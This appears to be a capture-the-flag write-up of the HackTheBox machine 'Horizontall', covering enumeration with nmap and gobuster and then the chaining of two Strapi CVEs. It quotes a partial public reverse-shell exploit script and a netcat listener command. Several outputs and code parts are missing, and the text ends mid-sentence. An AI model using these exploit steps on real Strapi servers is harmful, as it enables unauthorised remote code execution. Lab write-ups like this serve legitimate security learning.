Horizontall is an easy level box on HackTheBox and was quite the difficult box for me to solve. It felt way more difficult than all the other easy boxes I have done until this
point. I had to use techniques I haven't done yet, such as port forwarding, virtual host enumeration, and chaining CVE's.
# Walkthrough
I started off with a quick nmap scan on all ports `nmap -p- <ip>` just to see what is running and I got these results
```markdown
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-03 19:46 EDT
Nmap scan report for 10.10.11.105
Host is up (0.083s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds
```
So now I'm going to do a deeper scan on those running services by running the command `nmap -sC -sV -A -p 22,80 <ip>` and I get these results

Nothing really sticks out to me except the domain under the port 80 scan so I'm just going to try to access the web server on port 80. I'm going to add the domain to my `/etc/hosts` file first so I can actually access it, because, based on this scan, the domain wasn't accessible yet. Just run the command `nano /etc/hosts` as root and add `<ip> horizontall.htb` to it.

Now nothing really stuck out to me when I actually accessed the website. There was an input box but the submission button did nothing. I tried enumerating some directories with gobuster and those didn't give me any significant findings. So now I'm going to try to search for any subdomains using gobuster. I ran
`gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u horizontall.htb` and I got the result

So now we see a subdomain. Lets access it by first adding the domain and the ip address into the `/etc/hosts` file like we did with the domain `horizontall.htb`.

After accessing, it's pretty much empty so I'm gonna go ahead and enumerate some directories using `gobuster dir -w /usr/share/wordlists/dirb/big.txt -u api-prod.horizontall.htb`. The gobuster scan gives me these results

The admin page looks pretty interesting, so I'm gonna check it out.

It's running something called strapi, so lets see if theres some existing exploits or CVE's for this thing. A quick google search lands me this <a href="https://www.exploit-db.com/exploits/50239">exploitdb</a> code for CVE-2019-18818 + CVE-2019-19609:
```markdown

So now I can login to the site, I have a JSON Token, and I have a web shell. Normally I would see what I could enumerate from the site but I found another some <a href="https://github.com/dasithsv/CVE-2019-19609"> Github code </a> that utilizes my jwt to gain a reverse shell. The codes reads as:

import requests
import sys

print("\n\n\nStrapi Framework Vulnerable to Remote Code Execution - CVE-2019-19609")
print("please set up a listener on port 9001 before running the script. you will get a shell to that listener\n")

if len(sys.argv) ==5:
    rhost = sys.argv[1]
    lhost = sys.argv[2]
    jwt = sys.argv[3]
    url = sys.argv[4]+'admin/plugins/install'

    headers = {

    response = requests.post(url, headers=headers, data=data, verify=False)

else:

 ```
 According to the code and documentation, I have to set up a listener on port 9001 before I run this so I open another terminal window and run `nc -nvlp 9001`. I copy the code into a `.py` file, make it executable, and run it with `
